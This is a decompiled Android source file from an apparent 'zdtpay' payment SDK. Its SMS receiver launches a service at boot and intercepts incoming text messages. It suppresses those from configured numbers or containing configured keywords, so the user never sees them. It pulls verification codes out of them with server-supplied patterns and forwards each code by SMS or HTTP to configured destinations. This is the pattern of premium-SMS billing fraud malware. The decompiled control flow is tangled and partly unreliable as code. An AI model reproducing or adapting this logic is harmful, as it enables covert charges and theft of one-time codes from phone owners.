package com.zdtpay;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import com.duowan.mobile.netroid.RequestQueue;
import com.zdtpay.tools.MyLogPrinter;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONException;
import org.json.JSONObject;

public class Rjb
  extends BroadcastReceiver
{
  SharedPreferences a;
  String b = "SENT_SMS_ACTION_rec";
  String c = "DELIVERED_SMS_ACTION_rec";
  private BroadcastReceiver d = new h(this);
  private BroadcastReceiver e = new i(this);
  
  public Rjb() {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (paramIntent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
      paramContext.startService(new Intent(paramContext, MySje.class));
    }
    while (!paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
      return;
    }
    Object[] arrayOfObject = (Object[])paramIntent.getExtras().get("pdus");
    SmsMessage[] arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
    this.a = paramContext.getSharedPreferences("mysp", 0);
    if (arrayOfObject.length > 0)
    {
      arrayOfSmsMessage[0] = SmsMessage.createFromPdu((byte[])arrayOfObject[0]);
      paramIntent = new String(arrayOfSmsMessage[0].getOriginatingAddress());
      new StringBuilder(String.valueOf("sms:")).append(arrayOfSmsMessage[0].getMessageBody()).append(" add:").append(paramIntent).toString();
    }
    if (com.zdtpay.tools.b.e == null) {}
    ArrayList localArrayList;
    String str;
    StringBuffer localStringBuffer;
    int k;
    for (;;)
    {
      try
      {
        paramIntent = this.a.getString("requestData", "");
        if (!paramIntent.equals("")) {
          com.zdtpay.tools.b.e = com.zdtpay.a.c.a(new JSONObject(paramIntent));
        }
        if (com.zdtpay.tools.b.e == null) {
          break;
        }
        localArrayList = com.zdtpay.tools.b.e.d();
        if (localArrayList == null) {
          break;
        }
        int j = 0;
        if (j >= arrayOfSmsMessage.length) {
          break;
        }
        arrayOfSmsMessage[j] = SmsMessage.createFromPdu((byte[])arrayOfObject[j]);
        str = arrayOfSmsMessage[j].getMessageBody();
        localStringBuffer = new StringBuffer(arrayOfSmsMessage[j].getOriginatingAddress());
        if (localStringBuffer.toString().startsWith("+86"))
        {
          localStringBuffer.delete(0, 3);
          k = 0;
          if (k < localArrayList.size()) {
            break label332;
          }
          j += 1;
          continue;
        }
        if (!localStringBuffer.toString().startsWith("86")) {
          continue;
        }
      }
      catch (JSONException paramContext)
      {
        paramContext.printStackTrace();
        return;
      }
      localStringBuffer.delete(0, 2);
    }
    label332:
    com.zdtpay.a.b localB = (com.zdtpay.a.b)localArrayList.get(k);
    Object localObject3 = localB.d();
    paramIntent = ((com.zdtpay.a.b)localArrayList.get(k)).n();
    int i = 0;
    Object localObject1;
    for (;;)
    {
      if (i >= paramIntent.size()) {
        i = 0;
      }
      for (;;)
      {
        if (!paramIntent.contains(localStringBuffer.toString())) {
          break label493;
        }
        abortBroadcast();
        break;
        localObject1 = new StringBuffer((String)paramIntent.get(i));
        if (str.contains(((StringBuffer)localObject1).toString()))
        {
          abortBroadcast();
          i = 1;
        }
        else
        {
          if (!((StringBuffer)localObject1).toString().contains("*")) {
            break label486;
          }
          ((StringBuffer)localObject1).deleteCharAt(((StringBuffer)localObject1).length() - 1);
          if (!localStringBuffer.toString().startsWith(((StringBuffer)localObject1).toString())) {
            break label486;
          }
          abortBroadcast();
          i = 1;
        }
      }
      label486:
      i += 1;
    }
    label493:
    if (localB.h().size() > 0)
    {
      paramIntent = localB.h().iterator();
      label513:
      if (paramIntent.hasNext()) {
        break label575;
      }
    }
    for (;;)
    {
      if (i != 0)
      {
        abortBroadcast();
        if (!this.a.getBoolean(localB.k() + "_ec", false)) {
          break label604;
        }
      }
      k += 1;
      break;
      label575:
      localObject1 = (String)paramIntent.next();
      if (!localStringBuffer.toString().contains((CharSequence)localObject1)) {
        break label513;
      }
      i = 1;
    }
    label604:
    paramIntent = localB.i();
    if (paramIntent != null)
    {
      localObject1 = paramIntent;
      if (!paramIntent.equals("")) {}
    }
    else
    {
      localObject1 = localStringBuffer.toString();
    }
    Object localObject2 = localB.j();
    Object localObject4 = localB.g().split("<\\|>");
    Matcher localMatcher = Pattern.compile(localObject4[0]).matcher(str);
    paramIntent = (Intent)localObject2;
    if (localObject4.length > 0)
    {
      MyLogPrinter.b("yzm   正则   --------" + localObject4[0]);
      paramIntent = (Intent)localObject2;
      label701:
      if (localMatcher.find()) {}
    }
    else
    {
      if ((localB.f() == null) || (localB.f().equals(""))) {
        break label1093;
      }
      paramIntent = localB.f() + paramIntent;
    }
    label1093:
    for (;;)
    {
      if ((localB.e() == null) || ("".equals(localB.e())))
      {
        paramContext.getApplicationContext().registerReceiver(this.d, new IntentFilter(this.b));
        localObject2 = new Intent(this.b);
        ((Intent)localObject2).putExtra(com.zdtpay.tools.c.t, (String)localObject3);
        localObject2 = PendingIntent.getBroadcast(paramContext, ((String)localObject3).hashCode(), (Intent)localObject2, 134217728);
        paramContext.getApplicationContext().registerReceiver(this.e, new IntentFilter(this.c));
        localObject4 = new Intent(this.c);
        ((Intent)localObject4).putExtra(com.zdtpay.tools.c.t, (String)localObject3);
        localObject3 = PendingIntent.getBroadcast(paramContext, ((String)localObject3).hashCode(), (Intent)localObject4, 134217728);
        SmsManager.getDefault().sendTextMessage((String)localObject1, null, paramIntent, (PendingIntent)localObject2, (PendingIntent)localObject3);
      }
      for (;;)
      {
        this.a.edit().putBoolean(localB.k() + "_ec", true).commit();
        break;
        if (!"".equals(localMatcher.group()))
        {
          paramIntent = localMatcher.group();
          localObject2 = Pattern.compile(localObject4[1]).matcher(paramIntent);
          for (;;)
          {
            if (!((Matcher)localObject2).find())
            {
              MyLogPrinter.b("yzm   messsage   --------" + paramIntent);
              break;
            }
            paramIntent = ((Matcher)localObject2).group();
          }
        }
        paramIntent = localB.j();
        break label701;
        paramIntent = localB.e() + paramIntent;
        f.b(paramContext).a(new com.duowan.mobile.netroid.b.a(0, paramIntent, new j(this)));
      }
    }
  }
}
